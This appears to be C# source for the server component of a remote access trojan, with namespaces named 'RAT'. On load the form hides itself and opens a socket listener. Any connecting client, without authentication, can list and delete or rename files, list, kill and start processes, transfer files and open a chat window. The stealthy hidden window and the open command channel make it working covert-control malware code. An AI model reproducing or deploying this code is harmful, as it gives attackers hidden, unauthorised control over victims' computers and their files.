using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using RAT.Communicate;
using RAT.Core;
using System.Threading;
using System.Net.Sockets;
using static RemoteAccessUI_Server.MyGlobal;
using System.Diagnostics;

namespace RemoteAccessUI_Server
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public delegate void UpdateData();
        private void button1_Click(object sender, EventArgs e)
        {
            /**FileDataStucture data = new FileDataStucture() {myIpAddress = "192.168.0.100", availableIp = new List<String> {"System=192.168.0.100","DaddyPC=192.168.0.101" } };
            FileManagement f = new FileManagement() { fileData = data};
            f.write();
            MessageBox.Show("Done");*/
            MyGlobal.fileManagement = new FileManagement();
            MyGlobal.fileManagement.read();
            MessageBox.Show(MyGlobal.fileManagement.fileData.myIpAddress);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Hide();
            Thread temp = new Thread(InitiateOpenServer);
            temp.Start();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void InitiateOpenServer()
        {
            fileManagement = new FileManagement();
            fileManagement.read();

            RServer openServer = new RServer(fileManagement.fileData.myIpAddress, OPEN_COMMUNICATION_PORT.ToString());
            openServer.setOnNewDeviceConnectedCallback(
                new RServer.NewDeviceConnected(
                    (RServer _client, CommunicationNetworkStream _stream)=>
                    {
                        //CHECK IF THIS CLIENT IS ACTUALLY WANTS TO HAVE A NEW CONNECTION
                        string __data = _stream.ReadString(true);
                        string[] __pp = __data.Split(':');
                        string requestCode = __pp[0];
                        switch (requestCode)
                        {
                            case "NEW_CONNECTION":
                                allcoateNewConnection(_client, _stream);
                                break;
                            case "NEW_OR_REDIRECT_CONNECTION":      //NEW_OR_REDIRECT_CONNECTION:othId
                                if (ConnectedClients.ContainsKey(__pp[1]))
                                {   //THE CLIENT HAS AN ALREADY ALLOCATED PORT
                                    //INSTRUCT TO MOVE
                                    NetworkClient cL = ((NetworkClient)ConnectedClients[__pp[1]]);
                                    _stream.WriteString($"MOVE_TO_PORT:{cL.clientPort.ServerPort}:{cL.othId}");

                                    Debug.WriteLine($"NEW_OR_REDIRECT_CONNECTION: redirected to port.{cL.clientPort.ServerPort}:{cL.othId}");

                                }
                                else { allcoateNewConnection(_client, _stream); MessageBox.Show("NEW_OR_REDIRECT_CONNECTION: new port allocated"); }
                                    
                                break;
                        }                                                                            
                        
                    }
                )
             );

            openServer.Initialize(true);
        }
        private void allcoateNewConnection(RServer openServer, CommunicationNetworkStream _stream)
        {
            ChatBoxForm chatWindow = null; ; //CHAT WINDOW

            //CHECK IF THEIR IS PORT LEFT TO ALLOCATE
            if (ConnectedClients.Count < ALLOCABLE_PORTS.Length)
            {
                NetworkClient client = new NetworkClient();
                client.othId = Guid.NewGuid().ToString(); //ALLOCATE ID
                

                //START THE SERVER
                client.clientPort = new RServer(fileManagement.fileData.myIpAddress, allocateNewPort().ToString());
                client.clientPort.setOnNewDeviceConnectedCallback(
                    new RServer.NewDeviceConnected(
                        (RServer sender, CommunicationNetworkStream stream) =>
                        {
                            String cId = stream.ReadString(true);   //WAIT TO GET ID

                            Debug.WriteLine($"CONNECTION: {((NetworkClient)ConnectedClients[cId]).clientPort.ServerPort}:{cId}");

                            if (((NetworkClient)ConnectedClients[cId]).clientPort.ServerPort != sender.ServerPort)
                                sender.DetachClient();
                        }
                        )
                    );
                client.clientPort.setOnDataReceivedCallback(
                    new RServer.DataReceived(
                        (RServer sender, CommunicationNetworkStream stream, string Data) =>
                        {                            

                            switch (CommandRecognization.Recognize(Data))
                            {
                                case ExchangeType.CLOSE_CONNECTION_REQUEST:
                                    closeConnection(sender);        //CLOSE CONNECTION
                                    MessageBox.Show("CLOSE_CONNECTION_REQUEST");
                                    break;
                                case ExchangeType.FS_LIST_DRIVE_REQUEST:
                                    FileSystem.SentDriveList(stream);
                                    break;
                                case ExchangeType.FS_LIST_DIRECTORY_REQUEST:
                                    FileSystem.SentDirectoryList(stream);
                                    break;
                                case ExchangeType.FS_LIST_FILE_REQUEST:
                                    FileSystem.SentFileList(stream); break;
                                case ExchangeType.FS_DELETE_REQUEST:
                                    FileSystem.ExecuteDelete(stream); break;
                                case ExchangeType.FS_RENAME_REQUEST:
                                    FileSystem.ExecuteRename(stream); break;
                                case ExchangeType.PROCESS_LIST_ALL_REQUEST:
                                    ProcessSystem.SentAllProcess(stream); break;
                                case ExchangeType.PROCESS_KILL_REQUEST:
                                    ProcessSystem.ExecuteKillProcess(stream); break;
                                case ExchangeType.PROCESS_START_REQUEST:
                                    ProcessSystem.ExecuteProcess(stream); break;
                                case ExchangeType.FILE_TRANSFER:
                                    FileReceiver fr = new FileReceiver(stream).Initialize();
                                    fr.StartReceiving();
                                    break;
                                case ExchangeType.FILE_TRANSFER_REQUEST:
                                    FileTransferRequest ft = new FileTransferRequest(stream).Initialize();
                                    ft.StartTransfering();
                                    Thread.Sleep(1000);
                                    break;
                                case ExchangeType.NULL:
                                    //EXTENDED MODE
                                    int len = Data.IndexOf(':');
                                    string command = Data;
                                    if (len > 0) command = Data.Substring(0, len);
                                    string arg = "";
                                    if (len > 0) arg=Data.Substring(len + 1);
                                    switch (command)
                                    {
                                        case "CREATE_DIR":                                            
                                            try
                                            {
                                                System.IO.Directory.CreateDirectory(arg);
                                            }
                                            catch (Exception) { }
                                            break;
                                        case "CHAT_START":
                                            chatWindow = new ChatBoxForm();
                                            Invoke(new UpdateData(() => { chatWindow.client = sender; chatWindow.connectedIp = arg; chatWindow.Show();  }));
                                            break;
                                        case "CHAT_STOP":                                            
                                            Invoke(new UpdateData(() => { if (chatWindow != null) { chatWindow.Close(); chatWindow.Dispose(); chatWindow = null; } }));
                                            closeConnection(sender);        //CLOSE CONNECTION
                                            break;
                                        case "CHAT_MESSAGE":
                                            Invoke(new UpdateData(() => {
                                                if (chatWindow != null) { chatWindow.newMessage(arg); }
                                            }));
                                            break;
                                        default:
                                            break;
                                    }
                                    break;
                            }
                        }
                        )
                    );
                client.clientPort.Initialize(true);
                //TELL THE CLIENT TO MOVE TO A NEW PORT
                //INSTRUCT TO MOVE

                _stream.WriteString($"MOVE_TO_PORT:{client.clientPort.ServerPort}:{client.othId}");

                Debug.WriteLine($"NEW_CONNECTION: new port allocated.{client.clientPort.ServerPort}:{client.othId}");

                ConnectedClients.Add(client.othId, client);   //REGISTER CLIENT
            }
            else
                _stream.WriteString("WAIT_FOR_CONNECTION");
            //DISCONNECT THE CLIENT FORM THIS PORT
            openServer.DetachClient();
        }
        private void closeConnection(RServer server)
        {
            try
            {
                ConnectedClients.Remove(getOthIdOfClient(server));  //UNREGISTER CLIENT
                unRegisterPort(server.ServerPort);  //UNREGISTER CLIENT PORT
                try { server.DetachClient(); }
                catch (Exception) { }
                try { server.StopListening(); }
                catch (Exception) { }
            }
            catch (Exception) { }            
        }
    }
}
